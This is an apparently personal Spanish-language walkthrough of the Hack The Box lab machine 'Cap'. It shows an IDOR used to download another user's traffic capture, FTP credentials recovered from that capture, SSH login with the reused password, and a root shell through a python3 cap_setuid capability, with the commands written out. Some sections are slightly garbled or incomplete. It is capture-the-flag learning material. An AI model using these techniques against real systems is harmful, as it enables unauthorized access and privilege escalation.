# Máquina Cap (HTB)

- **IP:** 10.129.25.189
- **SO:** Linux (Ubuntu / Gunicorn - "Security Dashboard")
- **Resumen de la cadena:** dashboard web que permite descargar capturas de tráfico; IDOR en la ruta `/data/<id>` → descargar `0.pcap` de otro usuario → el pcap contiene un login FTP en claro (`nathan:Buck3tH4TF0RM3!`) → SSH como nathan → `python3` con capability `cap_setuid+ep` → root.

## 2. Enumeración web — IDOR en las capturas

- El dashboard genera informes de capturas de tráfico en rutas tipo `/data/<numero>`.
- **IDOR:** cambiando el número de la URL se accede a capturas de otros usuarios. Bajar la `0.pcap` alterando el id:
```
http://10.129.28.40/data/0
```
> [captura: dashboard "Security Dashboard" + descarga de 0.pcap]

## 3. Análisis del PCAP → credenciales FTP

**[en Kali] Leer el pcap con tshark (o Wireshark):**
```bash
tshark -r 0.pcap
```
> [captura: tráfico FTP en claro]
```

PASS Buck3tH4TF0RM3!
```

## 4. Acceso (user)

**[en Kali] SSH con las credenciales del FTP (reutilizadas):**
```bash

# pass: Buck3tH4TF0RM3!

```

## 5. Escalada de privilegios — Linux Capabilities

**[en la víctima] Buscar capabilities:**
```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.x cap_setuid+ep
```
> `cap_setuid` sobre python = podemos ponernos uid 0.

**[en la víctima] Abusar de la capability:**
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# id -> uid=0(root)
cd /root
cat root.txt
```

### Aprendizaje
- IDOR: probar siempre a manipular identificadores numéricos en las URLs.
- `getcap -r / 2>/dev/null` es parada obligatoria en privesc Linux. `cap_setuid+ep` sobre un intérprete = root directo.
